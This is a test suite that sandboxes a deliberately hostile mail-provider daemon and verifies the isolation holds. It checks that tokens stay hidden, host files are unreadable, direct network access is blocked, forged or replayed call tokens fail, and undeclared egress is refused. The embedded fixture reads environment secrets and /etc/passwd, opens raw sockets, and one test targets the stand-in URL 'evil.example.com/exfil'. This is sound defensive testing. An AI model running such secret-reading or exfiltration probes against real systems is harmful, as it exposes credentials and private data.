/**
 * Hostile-provider isolation suite for sandboxed `daemon` providers
 * (plan generalized-integrations-google-migration-cupboard-workflows-2026-10-05
 * P-002, D-006; specs AUTO-BAR-R-12-P-002, ITEM-P-002-contract).
 *
 * Runs a REAL bubblewrap sandbox around a deliberately hostile provider
 * daemon and proves it cannot: read a token (env or wire), reach the network
 * directly, read host files, fetch an undeclared host, act for an account it
 * was not called for, reuse a call's authority after the call ends, or run at
 * all when the sandbox or host-mediated fetch is unavailable.
 *
 * Every isolation probe has an UNSANDBOXED positive control running the same
 * fixture, so a probe that silently stopped detecting (wrong path, wrong port)
 * fails here instead of reporting isolation that was never measured.
 */

import { spawn, type ChildProcess } from 'node:child_process';
import { existsSync, mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import net from 'node:net';
import os from 'node:os';
import path from 'node:path';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { JsonRpcBridge, providerSandboxWorks } from '@papercusp/plugin-loader/daemon';
import type { ProviderHost, ProviderSyncPage } from '@papercusp/plugin-sdk';
import { createHostFetch } from './host-fetch';
import { createProviderRegistry } from './provider-registry';
import { DaemonProviderError, startDaemonProvider, type DaemonProviderRuntime } from './daemon-provider';

const PROVIDER_ID = 'hostile-mail';
const TOKENS: Record<string, string> = { 'src-a': 'tok-A-9f2c1e7d', 'src-b': 'tok-B-4410aa02' };
const ENV_SECRET = 'env-canary-6b1d93f0';

const FIXTURE = String.raw`
import fs from 'node:fs';
import net from 'node:net';
import readline from 'node:readline';
const marker = process.argv[2];
if (marker) { try { fs.appendFileSync(marker, 'started\n'); } catch {} }
const DESCRIPTOR = {
  id: 'hostile-mail', contractVersion: 1, displayName: 'Hostile mail',
  datatypes: ['email-message'], capabilities: ['mail.send'], egressHosts: ['api.hostile.test'],
};
const transcript = [];
const pending = new Map();
let nextId = 1; let stashed = null; let syncCalls = 0;
const send = (m) => process.stdout.write(JSON.stringify(m) + '\n');
const hostFetch = (params) => new Promise((resolve) => {
  const id = nextId++; pending.set(id, resolve);
  send({ jsonrpc: '2.0', id, method: 'host.fetch', params });
});
const probe = (cfg) => new Promise((resolve) => {
  const out = { envKeys: Object.keys(process.env).sort(), envValues: Object.values(process.env) };
  for (const f of [cfg.canaryPath, '/etc/passwd']) {
    try { fs.readFileSync(f, 'utf8'); out[f] = 'READABLE'; } catch (e) { out[f] = e.code; }
  }
  let settled = false;
  const s = net.connect(cfg.port, '127.0.0.1');
  const done = (v) => { if (settled) return; settled = true; out.net = v; s.destroy(); resolve(out); };
  s.on('connect', () => done('OPEN'));
  s.on('error', (e) => done(e.code));
  setTimeout(() => done('TIMEOUT'), 3000);
});
async function handle(method, params) {
  if (method === 'papercup.ping') return 'pong';
  if (method === 'provider.describe') return DESCRIPTOR;
  if (method === 'provider.syncPage' || method === 'provider.invoke') {
    if (method === 'provider.syncPage') syncCalls++;
    const { request, callToken } = params;
    const cfg = request.config ?? request.args ?? {};
    let result = {};
    if (cfg.attack === 'probe') result = await probe(cfg);
    if (cfg.attack === 'fetch') result = await hostFetch({ callToken, source: cfg.source ?? request.source, request: { url: cfg.url } });
    if (cfg.attack === 'forged') result = await hostFetch({ callToken: 'f'.repeat(64), source: request.source, request: { url: cfg.url } });
    if (cfg.attack === 'stash') { stashed = callToken; result = { stashed: true }; }
    if (cfg.attack === 'replay') result = await hostFetch({ callToken: stashed, source: request.source, request: { url: cfg.url } });
    if (cfg.attack === 'count') result = { syncCalls };
    return { records: [{ datatype: 'email-message', nativeId: 'n1', event: 'upsert',
      payload: { result, transcript: transcript.join('\n') } }], nextCursor: null, hasMore: false };
  }
  const err = new Error('method not found: ' + method); err.code = -32601; throw err;
}
readline.createInterface({ input: process.stdin }).on('line', async (line) => {
  transcript.push(line);
  let msg; try { msg = JSON.parse(line); } catch { return; }
  if (msg.method === undefined && msg.id != null) {
    const r = pending.get(msg.id); pending.delete(msg.id);
    r?.(msg.error ? { error: msg.error } : { result: msg.result });
    return;
  }
  try { send({ jsonrpc: '2.0', id: msg.id, result: await handle(msg.method, msg.params) }); }
  catch (e) { send({ jsonrpc: '2.0', id: msg.id, error: { code: e.code ?? -32000, message: e.message } }); }
});
`;

type ProbeResult = Record<string, unknown> & { envKeys: string[]; envValues: string[]; net: string };
type FetchOutcome = { result?: { status: number; body: string }; error?: { code: number; message: string } };

let root = '';
let pluginDir = '';
let canaryPath = '';
let markerPath = '';
let server: net.Server;
let port = 0;
let runtime: DaemonProviderRuntime;
const fetchLog: Array<{ url: string; authorization: string | null }> = [];
const accessTokenFor: string[] = [];
let host: ProviderHost;

function payloadOf(page: ProviderSyncPage): { result: unknown; transcript: string } {
  return page.records[0]!.payload as { result: unknown; transcript: string };
}

async function attack(config: Record<string, unknown>, source = 'src-a') {
  return payloadOf(await runtime.adapter.syncPage({ source, cursor: null, mode: 'incremental', config }, host));
}

beforeAll(async () => {
  root = mkdtempSync(path.join(os.tmpdir(), 'daemon-provider-'));
  pluginDir = path.join(root, 'plugin');
  mkdirSync(pluginDir);
  mkdirSync(path.join(root, 'host-only'));
  canaryPath = path.join(root, 'host-only', 'canary.txt');
  writeFileSync(canaryPath, 'host secret\n');
  markerPath = path.join(root, 'host-only', 'started.marker');
  writeFileSync(path.join(pluginDir, 'hostile.mjs'), FIXTURE);
  process.env.PAPERCUSP_TEST_PROVIDER_SECRET = ENV_SECRET;

  server = net.createServer((c) => c.end());
  await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', () => resolve()));
  port = (server.address() as net.AddressInfo).port;

  const registry = createProviderRegistry();
  runtime = await startDaemonProvider({
    pluginName: 'hostile-mail-plugin',
    pluginDir,
    cmd: [process.execPath, path.join(pluginDir, 'hostile.mjs'), markerPath],
    healthIntervalMs: 0,
    callTimeoutMs: 15_000,
  });
  await registry.register({ descriptor: runtime.descriptor, adapter: runtime.adapter, pluginName: 'hostile-mail-plugin', runtime: 'daemon' });
  host = {
    fetch: createHostFetch(PROVIDER_ID, {
      registry,
      resolveSource: async (sourceId) => (TOKENS[sourceId] ? { sourceId, providerId: PROVIDER_ID } : null),
      accessToken: async (source) => {
        accessTokenFor.push(source.sourceId);
        return TOKENS[source.sourceId] ?? null;
      },
      fetchImpl: (async (input: URL | string, init?: RequestInit) => {
        const headers = new Headers(init?.headers);
        fetchLog.push({ url: String(input), authorization: headers.get('authorization') });
        return new Response(JSON.stringify({ ok: true }), { status: 200, headers: { 'content-type': 'application/json' } });
      }) as typeof fetch,
    }),
  };
}, 30_000);

afterAll(async () => {
  await runtime?.shutdown();
  server?.close();
  delete process.env.PAPERCUSP_TEST_PROVIDER_SECRET;
  if (root) rmSync(root, { recursive: true, force: true });
});

describe('sandboxed daemon provider — hostile isolation (P-002)', () => {
  it('runs on a host where the exact provider sandbox profile is available (precondition, not a skip)', async () => {
    expect(await providerSandboxWorks({ pluginDir, runtimeDirs: [path.dirname(path.dirname(process.execPath))] })).toBe(true);
    expect(runtime.descriptor.id).toBe(PROVIDER_ID);
    // The sandboxed daemon could not write the host-side marker.
    expect(existsSync(markerPath)).toBe(false);
  });

  it('positive control: the same fixture UNSANDBOXED sees the env secret, the canary file and the network', async () => {
    const child: ChildProcess = spawn(process.execPath, [path.join(pluginDir, 'hostile.mjs')], {
      env: process.env,
      stdio: ['pipe', 'pipe', 'inherit'],
    });
    try {
      const bridge = new JsonRpcBridge(child.stdout!, child.stdin!);
      const page = await bridge.call<ProviderSyncPage>('provider.syncPage', {
        request: { source: 'src-a', cursor: null, mode: 'incremental', config: { attack: 'probe', canaryPath, port } },
        callToken: 'unused',
      });
      const probe = payloadOf(page).result as ProbeResult;
      expect(probe.envValues).toContain(ENV_SECRET);
      expect(probe[canaryPath]).toBe('READABLE');
      expect(probe['/etc/passwd']).toBe('READABLE');
      expect(probe.net).toBe('OPEN');
    } finally {
      child.kill('SIGKILL');
    }
  });

  it('sandboxed: scrubbed env, no host files, no direct socket', async () => {
    const probe = (await attack({ attack: 'probe', canaryPath, port })).result as ProbeResult;
    expect(probe.envKeys.filter((k) => !['HOME', 'PATH', 'PWD'].includes(k))).toEqual([]);
    expect(probe.envValues.join('\n')).not.toContain(ENV_SECRET);
    expect(probe[canaryPath]).toBe('ENOENT');
    expect(probe['/etc/passwd']).toBe('ENOENT');
    expect(probe.net).not.toBe('OPEN');
  });

  it('host.fetch to a declared host succeeds with the token injected host-side; the daemon never receives it', async () => {
    const before = fetchLog.length;
    const { result, transcript } = await attack({ attack: 'fetch', url: 'https://api.hostile.test/v1/messages' });
    const outcome = result as FetchOutcome;
    expect(outcome.error).toBeUndefined();
    expect(outcome.result?.status).toBe(200);
    expect(fetchLog.slice(before)).toEqual([
      { url: 'https://api.hostile.test/v1/messages', authorization: `Bearer ${TOKENS['src-a']}` },
    ]);
    for (const token of Object.values(TOKENS)) expect(transcript).not.toContain(token);
  });

  it('host.fetch to an undeclared host is refused before any network call', async () => {
    const before = fetchLog.length;
    const outcome = (await attack({ attack: 'fetch', url: 'https://evil.example.com/exfil' })).result as FetchOutcome;
    expect(outcome.error?.code).toBe(-32003);
    expect(outcome.error?.message).toMatch(/egress-denied/);
    expect(fetchLog.length).toBe(before);
  });

  it('cannot act for another account of the same provider during a call', async () => {
    const before = { fetches: fetchLog.length, tokens: accessTokenFor.length };
    const outcome = (await attack({ attack: 'fetch', source: 'src-b', url: 'https://api.hostile.test/v1/messages' }, 'src-a'))
      .result as FetchOutcome;
    expect(outcome.error?.code).toBe(-32002);
    expect(outcome.error?.message).toMatch(/source-not-bound/);
    expect(fetchLog.length).toBe(before.fetches);
    expect(accessTokenFor.slice(before.tokens)).not.toContain('src-b');
  });

  it('a forged call token is refused', async () => {
    const outcome = (await attack({ attack: 'forged', url: 'https://api.hostile.test/v1/messages' })).result as FetchOutcome;
    expect(outcome.error?.code).toBe(-32001);
  });

  it("a call's token is dead once the call returns (no replay from a later call)", async () => {
    await attack({ attack: 'stash' });
    expect(runtime.activeCalls()).toBe(0);
    const before = fetchLog.length;
    const outcome = (await attack({ attack: 'replay', url: 'https://api.hostile.test/v1/messages' })).result as FetchOutcome;
    expect(outcome.error?.code).toBe(-32001);
    expect(fetchLog.length).toBe(before);
  });

  it('refuses a call without host-mediated fetch before the daemon is contacted', async () => {
    const countBefore = (await runtime.adapter.invoke({ source: 'src-a', capability: 'mail.send', args: { attack: 'count' } }, host)) as ProviderSyncPage;
    const before = (payloadOf(countBefore).result as { syncCalls: number }).syncCalls;
    await expect(
      runtime.adapter.syncPage({ source: 'src-a', cursor: null, mode: 'incremental' }, undefined as unknown as ProviderHost),
    ).rejects.toMatchObject({ code: 'host-fetch-unavailable' });
    await expect(
      runtime.adapter.syncPage({ source: 'src-a', cursor: null, mode: 'incremental' }, {} as ProviderHost),
    ).rejects.toBeInstanceOf(DaemonProviderError);
    const countAfter = (await runtime.adapter.invoke({ source: 'src-a', capability: 'mail.send', args: { attack: 'count' } }, host)) as ProviderSyncPage;
    expect((payloadOf(countAfter).result as { syncCalls: number }).syncCalls).toBe(before);
  });

  it('fails closed when the sandbox cannot be established: the daemon never runs', async () => {
    for (const bwrapBinary of ['/usr/bin/false', path.join(root, 'no-such-bwrap')]) {
      await expect(
        startDaemonProvider({
          pluginName: 'hostile-mail-plugin',
          pluginDir,
          cmd: [process.execPath, path.join(pluginDir, 'hostile.mjs'), markerPath],
          bwrapBinary,
          healthIntervalMs: 0,
        }),
      ).rejects.toMatchObject({ code: 'sandbox-unavailable' });
    }
    expect(existsSync(markerPath)).toBe(false);
  });
});
